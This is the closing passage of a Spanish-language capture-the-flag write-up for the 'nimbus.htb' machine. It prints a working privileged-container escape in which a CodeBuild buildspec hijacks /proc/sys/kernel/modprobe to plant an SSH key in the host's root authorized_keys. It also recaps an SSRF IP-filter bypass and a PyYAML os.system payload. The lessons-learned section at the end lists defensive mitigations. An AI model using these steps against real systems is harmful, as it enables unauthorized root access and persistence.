worker@7a59d40b155d:/tmp$ mount | grep overlay
```

```
overlay on / type overlay (rw,relatime,
  lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/165/fs:...
  upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs,
  workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/work,
  nouserxattr)
```

```bash
worker@7a59d40b155d:/tmp$ cat /proc/mounts | grep overlay
```

```
overlay / overlay rw,relatime,lowerdir=...,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs,workdir=...,nouserxattr 0 0
```

**Hallazgo:** el path **`/var/lib/containerd/.../166/fs`** es el **`upperdir` del host** que corresponde a la raíz del contenedor. Si escribimos `/x.sh` dentro del contenedor, el archivo aparece en el host como **`/var/lib/containerd/.../166/fs/x.sh`**.

### 10.3 Mecánica del hook `modprobe`

Cuando el kernel intenta ejecutar (`execve()`) un archivo con un **formato binario no reconocido** (ELF, script con shebang válido, etc.), invoca un **helper** del espacio de usuario para que intente cargar un módulo que soporte ese formato. Ese helper es **`/sbin/modprobe`** por defecto, pero su ruta es configurable mediante el archivo:

```
/proc/sys/kernel/modprobe
```

Puntos críticos del mecanismo:

1. **El setting es global para el kernel**, no está namespaced. Todos los contenedores y el host comparten el mismo valor.
2. **El helper se ejecuta en los namespaces del host**, no en los del contenedor. Aunque lo escriba un proceso dentro del contenedor, el kernel lo ejecuta con los namespaces del host (PID, mount, etc.).
3. **El helper se ejecuta como root** (el kernel no cambia de usuario para lanzarlo).

Combinando (1) + (2) + (3) con `CAP_SYS_ADMIN`, un contenedor privilegiado puede:

- **Redirigir** `/proc/sys/kernel/modprobe` a un script propio.
- **Trigger** la ejecución del helper lanzando un binario con formato inválido.
- **Obtener ejecución como root en el namespace del host**.

### 10.4 Consideración clave: path del host vs. path del contenedor

Como el helper se ejecuta en el **namespace de mount del host**, la ruta del script **debe ser la ruta del host**, no la del contenedor. Es decir:

- ❌ `/x.sh` — path del contenedor; el kernel del host no lo ve ahí.
- ✅ `/var/lib/containerd/.../166/fs/x.sh` — path del `upperdir` en el host; ahí sí lo ve.

Por eso el buildspec extrae `upperdir` de `/proc/mounts` y construye la ruta completa.

### 10.5 Construcción del buildspec de escape

```yaml
name: pwn3
source:
  type: NO_SOURCE
  buildspec: |
    version: 0.2
    phases:
      build:
        commands:
          - sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts | head -1 > /up.txt; cat /up.txt
          - printf '#!/bin/sh\nmkdir -p /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE1peo9KAWmqxIOzhRNHNbIVHmJrIFzWdiUA/bWqqNh5 kali@kali" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n' > /x.sh
          - chmod +x /x.sh
          - echo "$(cat /up.txt)/x.sh" > /proc/sys/kernel/modprobe; cat /proc/sys/kernel/modprobe
          - printf '\377\377\377\377' > /tr; chmod +x /tr; /tr 2>/dev/null || true
          - sleep 3; echo escape-done
artifacts:
  type: NO_ARTIFACTS
environment:
  type: LINUX_CONTAINER
  image: floci/floci:latest
  computeType: BUILD_GENERAL1_SMALL
  privilegedMode: true
  environmentVariables:
    - name: "BASH_FUNC_id%%"
      value: '() { echo "uid=1000(worker) gid=1000(worker) groups=1000(worker)"; }'
      type: PLAINTEXT
serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
```

**Desglose de cada paso:**

1. **Extraer `upperdir`**: `sed` captura el valor tras `upperdir=` en `/proc/mounts` y lo guarda en `/up.txt`. El path del host queda en `/up.txt` (que también cae en el `upperdir` del contenedor, así que es accesible desde el host).

2. **Escribir `/x.sh`**: crea un script que añade nuestra clave SSH al `/root/.ssh/authorized_keys` del host y ajusta permisos. Al escribirlo en `/` del contenedor, cae en `upperdir/x.sh` del host.

3. **Hacer ejecutable `/x.sh`**: `chmod +x` afecta al archivo en el `upperdir`.

4. **Redirigir `modprobe`**: `echo "$(cat /up.txt)/x.sh" > /proc/sys/kernel/modprobe` — apunta el helper del kernel al script en la **ruta del host**.

5. **Trigger**: `printf '\377\377\377\377' > /tr; chmod +x /tr; /tr` — crea un archivo con 4 bytes `0xff`, lo hace ejecutable e intenta ejecutarlo. El kernel no reconoce el formato y llama a `modprobe` → ejecuta `/x.sh` **como root en el host**.

6. **Sleep**: da tiempo a que el helper se ejecute antes de que el build termine.

### 10.6 Ejecución del escape

```bash
worker@7a59d40b155d:/tmp$ aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/c.yml
aws --endpoint-url http://floci:4566 codebuild start-build --project-name pwn3
aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids pwn3:1
```

**Resultado (extracto):**

```json
{
    "currentPhase": "COMPLETED",
    "buildStatus": "SUCCEEDED",
    "phases": [
        ...
        {
            "phaseType": "BUILD",
            "phaseStatus": "SUCCEEDED",
            "startTime": "2026-11-17T17:15:12.936000+00:00",
            "endTime": "2026-11-17T17:15:16.053000+00:00",
            "durationInSeconds": 3
        },
        ...
    ],
    "environment": {
        "environmentVariables": [...],
        "privilegedMode": true
    }
}
```

**Hallazgo:** el build **SUCCEEDED**. Las 3 fases de la compilación se ejecutaron en 3 segundos, tiempo suficiente para:

- Escribir `/x.sh` (Fase 10.5, paso 2).
- Apuntar `modprobe` (paso 4).
- Disparar la carga del módulo (paso 5).
- Ejecutar `/x.sh` como root en el host → clave SSH instalada.

---

## Fase 11: SSH como root

Verificamos la instalación de la clave SSH y accedemos:

```bash
ssh root@nimbus.htb -i id_ed25519
```

**Resultado:**

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...
Last login: Tue Nov 17 17:18:24 2026 from 10.10.15.18
root@nimbus:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Hallazgo:** acceso **root** al host. La cadena completa se ha materializado:

1. SSRF → credenciales de rol `nimbus-web-role`.
2. Deserialización YAML en el worker → shell como `worker`.
3. Credenciales AKIA del worker → CodeBuild.
4. Contenedor privilegiado de CodeBuild → escape vía `modprobe` → root en el host.

---

## 📌 Conclusión

1. **Reconocimiento** → SSH (22) y HTTP (80, nginx → `nimbus.htb`).
2. **Enumeración web** → el enlace `healthcheck` expone `/api/v1/health`, que revela `aws.nimbus.htb`; `/login` deshabilitado con job submitter no autenticado.
3. **Preview de jobs** → `yaml_body` y `url=`; confirmación de backend Python vía `User-Agent: python-requests`.
4. **SSRF** → bypass del filtro de extensión con `?test.yml`; bypass del filtro de IP interna con notación octal `0251.0376.0251.0376`.
5. **Credenciales AWS** → `nimbus-web-role` con credenciales `ASIA` temporales.
6. **Reconocimiento SQS** → cola `nimbus-jobs`, `receive` denegado, `send` permitido.
7. **Deserialización YAML** → payload `!!python/object/apply:os.system` → shell como `worker`.
8. **Análisis del código vulnerable** → `yaml.load` con `Loader=yaml.Loader` ejecuta código durante el parseo; `safe_load` habría bloqueado el payload.
9. **Enumeración del contenedor** → credenciales `AKIA` en `env`, topología Docker, `floci` en `172.18.0.2`.
10. **Reconocimiento Floci** → S3, SQS, CodeBuild, etc. accesibles vía `floci:4566`; Lambda y otros servicios descartados por permisos.
11. **CodeBuild** → creación de proyecto con buildspec controlado, ejecutado en contenedor privilegiado.
12. **Escape vía `modprobe`** → `/proc/sys/kernel/modprobe` apuntado a script en `upperdir`, disparado con binario inválido → ejecución como root en el host.
13. **SSH como root** → clave instalada en `/root/.ssh/authorized_keys`.

---

## 📚 Lecciones aprendidas

1. **SSRF contra metadata de AWS expone credenciales del rol de instancia**  
   Bloquear el acceso a `169.254.169.254` desde cualquier servicio que haga fetch de URLs. Preferir **IMDSv2** (requiere PUT con token) sobre IMDSv1. Validar URLs con allowlist de dominios y resolver la IP antes de conectar.

2. **Los bypasses de filtros de IP siguen siendo efectivos**  
   La notación octal (`0251.0376.0251.0376`), decimal, hexadecimal o IPv4-mapped IPv6 son formas válidas de representar `169.254.169.254` que no coinciden con listas negras basadas en string. Resolver la IP a binario antes de comparar, o usar una librería de URL parsing robusta.

3. **`yaml.load` con `Loader=yaml.Loader` es ejecución de código**  
   `yaml.load` sin `SafeLoader` permite instanciar objetos Python arbitrarios durante el parseo, antes de cualquier validación del diccionario resultante. Usar **`yaml.safe_load`** o `yaml.load(..., Loader=yaml.SafeLoader)`. En PyYAML ≥ 6.0, `yaml.load` requiere un `Loader` explícito — la elección de `SafeLoader` debe ser deliberada.

4. **Credenciales en variables de entorno del contenedor son extraíbles**  
   Cualquier RCE dentro del contenedor permite leer `env`. Nunca inyectar credenciales permanentes (`AKIA`) en variables de entorno de contenedores. Usar **IAM roles para tareas** (ECS/EKS) con credenciales efímeras y scope mínimo.

5. **La diferencia `AKIA` vs `ASIA` importa**  
   - **`AKIA`**: usuario IAM permanente, sin expiración, alto valor ofensivo.
   - **`ASIA`**: rol asumido, expira en 1h (renovable), menor ventana de exposición.
   La rotación de claves `AKIA` debe ser agresiva.

6. **Contenedores privilegiados son equivalentes a root en el host**  
   `privileged: true` otorga `CAP_SYS_ADMIN` y acceso a `/proc/sys/*` del kernel. La configuración de `/proc/sys/kernel/modprobe` (o el `release_agent` de cgroups) permite ejecutar código como root en los namespaces del host. Nunca habilitar `privilegedMode` en CodeBuild salvo necesidad estricta.

7. **El escape vía `modprobe` es una primitiva genérica**  
   Cualquier contenedor privilegiado con `CAP_SYS_ADMIN` puede aprovechar `/proc/sys/kernel/modprobe` (o `core_pattern`, o `release_agent`) para escapar. Mitigaciones: usar contenedores sin privilegios, aplicar **seccomp** y **AppArmor**, montar `/proc/sys` como read-only, evitar `privileged: true`.

8. **La ruta del helper debe ser del host, no del contenedor**  
   El kernel invoca el helper desde el namespace del host. Por eso el script se escribe en `/` del contenedor (que cae en `upperdir` del host) y se referencia con la ruta del `upperdir` en `/proc/mounts`. Un error común es usar `/x.sh` y fallar silenciosamente.
